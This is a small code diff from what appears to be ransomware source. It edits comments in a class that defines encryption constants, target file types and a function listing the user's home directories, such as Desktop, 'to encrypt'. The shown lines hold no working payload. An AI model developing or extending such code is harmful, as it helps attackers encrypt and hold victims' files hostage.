@@ -18,9 +18,8 @@ class Base():
     BLOCK_SIZE_BYTES = 8192
     IV_SIZE = 16
     PADDING_BLOCK_SIZE = 16
-    MAX_FILE_SIZE_BYTES = 536870912 # 536870912B = 536 MB
+    MAX_FILE_SIZE_BYTES = 536870912
 
-    # TODO Place base dirs in here. Create a function we can call to return them
     FILETYPES = [
                 # GENERAL FORMATS
                 "sln",
@@ -47,6 +46,7 @@ class Base():
     def get_base_dirs(self, home_dir):
       # Function to return a list of base directories to encrypt
       # TODO Detect presence of network drives
+      # TODO Improve overall functionality for getting list of locations to encrypt
 
       base_dirs = [
                     os.path.join(home_dir, "Desktop"),
